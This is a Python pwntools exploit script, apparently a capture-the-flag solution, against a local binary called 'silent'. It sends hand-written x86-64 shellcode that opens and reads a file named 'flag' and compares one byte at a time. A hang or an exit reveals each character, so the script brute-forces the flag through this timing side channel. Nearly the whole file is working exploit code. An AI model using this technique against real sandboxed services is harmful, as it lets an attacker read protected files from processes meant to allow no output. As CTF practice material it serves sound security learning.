# -*- encoding: utf-8 -*-
from pwn import * 
context.update(arch='amd64',os='linux',log_level='info')
binary = './silent'
p = process(binary)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': 0x%x' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def silent( idx , ch ):
    ru("Welcome to silent execution-box.\n")
    sc = '''
        push 0x67616c66
        mov rdi , rsp
        xor rsi , rsi
        mov rax , 2
        syscall

        mov rdi , 3
        mov rsi , 0x10200
        mov rdx , r9
        xor rax , rax
        syscall

        cmp byte ptr [rsi+{0}] , {1}
        jz loop
        mov al,231
        syscall
        loop:
        jmp loop

    '''.format( idx,ch )

    shellcode = asm(sc)
    print(hex(len(shellcode)))
    # dbg('*$rebase(0x0000000000000C66)')
    se( shellcode)
    # p.interactive()

flag = ''

for idx in range(len(flag),32):
    sleep(1)
    log.success("flag : {}".format(flag))
    for ch in range(0x20 , 0x80):
        p = process(binary)
        try:
            silent(idx,ch)
            p.recvline(timeout=1)
            flag += chr(ch)
            p.send('\n')
            log.success("{} pos : {} success".format(idx,chr(ch)))
            p.close()
            break
        except:
            p.close()


'''
@File    :   silent.py
@Time    :   2021/10/03 17:43:57
@Author  :   Niyah 
'''
